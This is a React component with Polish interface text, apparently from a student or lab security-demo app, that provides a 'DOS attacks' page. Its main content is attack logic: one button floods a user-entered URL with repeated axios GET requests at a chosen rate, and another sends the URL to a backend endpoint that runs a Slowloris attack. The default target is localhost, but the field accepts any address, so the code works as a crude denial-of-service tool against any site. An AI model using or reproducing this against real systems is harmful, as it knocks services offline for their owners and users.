import React, { useState } from 'react'
import { ThemeProvider } from '@mui/material'
import { createTheme } from '@mui/material/styles'
import { TextField, Button } from '@mui/material'
import axios from 'axios'
import { BACKEND_URL } from '../../utils/config'
import {
  FormContainer,
  StyledContainer,
  SectionTitle,
  PageTitle,
  InputWrapper,
  GreenLabel,
  RedLabel,
} from './DDOS.styles'

let iterationValue = 0
const DDOS = (props) => {
  const [delay, setDelay] = useState(0)
  const [quantity, setQuantity] = useState(0)
  const [pageUrl, setPageUrl] = useState('http://localhost:8080')
  const [isError, setIsError] = useState(null)
  const [dos, setDos] = useState(null)
  const [responseSL, setResponseSL] = useState(null)
  const theme = createTheme({
    palette: {
      mode: 'light',
    },
  })

  /**
   * Po skończeniu wszystkich iteracji ataku następuje czyszczenie interwału czasowego i reset.
   * * Iteracyjne wywoływanie żądania zasobu
   */
  const dosSite = () => {
    setIsError(null);
    setDos(null);
    let dosInterval = setInterval(() => {
      for (let i = 0; i < quantity; i++) {
        axios
          .get(pageUrl)
          .then(() => {
            iterationValue++
          })
          .catch((error) => {
            if (!error.response) {
              setIsError('Error: Network Error ')
              clearInterval(dosInterval)
            } else {
              setIsError(error.response.data.message)
              clearInterval(dosInterval)
            }
          })
      }
      if (iterationValue > 5) {
        clearInterval(dosInterval)
        setDos('Dos atak wykonany')
      }
      if (isError !== null) {
        clearInterval(dosInterval)
      }
    }, delay)
  }

  /**
   * Funkcja atakująca sposobem slowLoris
   * @returns zwracanie odpowiedź z serwera.
   */
  const slowLoris = async () => {
    await axios
      .post(`${BACKEND_URL}/dos?url=${pageUrl}`)
      .then((response) => {
        setResponseSL(response)
      })
      .catch((error) => {
        if (!error.response) {
          setIsError('Error: Network Error ')
        } else {
          setIsError(error.response.data.message)
        }
      })
  }

  return (
    <ThemeProvider theme={theme}>
      <StyledContainer>
        <FormContainer>
          <PageTitle>DOS attacks</PageTitle>
          <SectionTitle>Zaatakuj stronę atakiem Odmowy dostępu</SectionTitle>
          <span>
            Podstawowe API jest ustawione automatycznie, jesli chcesz wybrać
            inne api wpisz je poniżej
          </span>
          <InputWrapper>
            <TextField
              fullWidth
              label="Podaj API Url strony do ataku"
              value={pageUrl}
              onChange={(e) => setPageUrl(e.target.value)}
            />
          </InputWrapper>
          <InputWrapper>
            <TextField
              fullWidth
              label="Podaj ilość ataków w jednej iteracji"
              value={quantity}
              onChange={(e) => setQuantity(e.target.value)}
            />
          </InputWrapper>
          <InputWrapper>
            <TextField
              fullWidth
              label="Podaj czas ponowienia iteracji"
              value={delay}
              onChange={(e) => setDelay(e.target.value)}
            />
          </InputWrapper>
          <InputWrapper>
            <Button
              size={'large'}
              variant={'contained'}
              onClick={() => dosSite()}
            >
              Przeprowadź attack Dos
            </Button>
          </InputWrapper>
        </FormContainer>
      </StyledContainer>
      <StyledContainer>
        <FormContainer>
          <SectionTitle>Zatakuj stronę atakiem Odmowy dostępu</SectionTitle>
          <span>
            Podstawowe API jest ustawione automatycznie, jesli chcesz wybrać
            inne api wpisz je poniżej
          </span>
          <InputWrapper>
            <TextField
              fullWidth
              label="Podaj API Url strony do ataku"
              value={pageUrl}
              onChange={(e) => setPageUrl(e.target.value)}
            />
          </InputWrapper>
          <InputWrapper>
            <Button
              size={'large'}
              variant={'contained'}
              onClick={() => slowLoris()}
            >
              Przeprowadź attack slow loris
            </Button>
          </InputWrapper>
          {dos && <GreenLabel>{dos}</GreenLabel>}
          {isError && <RedLabel>{isError}</RedLabel>}
          {responseSL && <GreenLabel>{responseSL}</GreenLabel>}
        </FormContainer>
      </StyledContainer>
    </ThemeProvider>
  )
}

export default DDOS
